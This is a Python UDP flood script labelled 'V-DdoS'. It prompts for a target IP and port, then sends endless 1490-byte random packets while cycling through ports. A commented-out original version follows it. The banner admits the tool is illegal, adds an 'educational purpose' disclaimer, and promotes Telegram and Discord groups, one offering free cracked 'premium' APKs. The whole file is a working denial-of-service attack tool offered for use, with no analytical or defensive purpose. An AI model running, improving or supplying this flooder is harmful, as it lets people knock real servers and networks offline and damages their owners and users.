import sys
import os
import time
import socket
import random

# Code Time
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet V-DdoS")
print("\n")
print("Coded By : Mr.BL4Z3, Modded by Fitsbit")
print("Author   : T34m V18rs, mod by Fitsbit")
print("Github   : github.com/T34mV18rs, https://github.com/Fitsbit")
print("Fb Page  : facebook.com/TeamVirusOfficial, Modder doesn't have fb")
print("FB Group : facebook.com/groups/mohinhossen, modder doesn't have fb")
print("Telegram : t.me/Crackerspace modder doesn't have fb")
print("Join Cracker Space TG Group To Get Premium Apk(s) Free modder doesn't have this")
print("Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problemfs")
print("Modder's Discord Server: https://discord.gg/qHbBZT6nMr")
print("Modder's Discord username: The King's Crown#1034")
print("\n")
ip = input("IP Target : ")
port = int(input("Port       : "))
os.system("clear")
print("\033[93m")
os.system("figlet DdoS Attack")
print("Team : T34m V18rs")
print("\033[92m")
print("This Mod pushes more bytes to the target ip, this mod also has a faster loading screen. Use port 8080. ")
print("[                    ] 0%")
time.sleep(1)
print("[=====               ] 25%")
time.sleep(1)
print("[==========          ] 50%")
time.sleep(1)
print("[===============     ] 75%")
time.sleep(1)
print("[====================] 100%")
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
     if port == 65534:
         port = 1

# import sys
# import os
# import time
# import socket
# import random

# # Code Time
# from datetime import datetime

# now = datetime.now()
# hour = now.hour
# minute = now.minute
# day = now.day
# month = now.month
# year = now.year

# ##############
# sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# chunk_size = 200000
# bytes = b''
# for i in range(8):
#     chunk = random._urandom(chunk_size)
#     bytes += chunk
# #############

# os.system("clear")
# os.system("figlet V-DdoS")
# print("\n")
# print("Coded By : Mr.BL4Z3")
# print("Author   : T34m V18rs")
# print("Github   : github.com/T34mV18rs")
# print("Fb Page  : facebook.com/TeamVirusOfficial")
# print("FB Group : facebook.com/groups/mohinhossen")
# print("Telegram : t.me/Crackerspace")
# print("Join Cracker Space TG Group To Get Premium Apk(s) Free")
# print("Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems")
# print("\n")
# ip = input("IP Target : ")
# port = int(input("Port       : "))
# os.system("clear")
# print("\033[93m")
# os.system("figlet DdoS Attack")
# print("Team : T34m V18rs")
# print("\033[92m")
# print("[                    ] 0%")
# time.sleep(0)
# print("[=====               ] 25%")
# time.sleep(0)
# print("[==========          ] 50%")
# time.sleep(0)
# print("[===============     ] 75%")
# time.sleep(0)
# print("[====================] 100%")
# time.sleep(3)
# sent = 0
# while True:
#      sock.sendto(bytes, (ip, port))
#      sent = sent + 1
#      port = port + 1
#      print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
#      if port == 65534:
#          port = 1
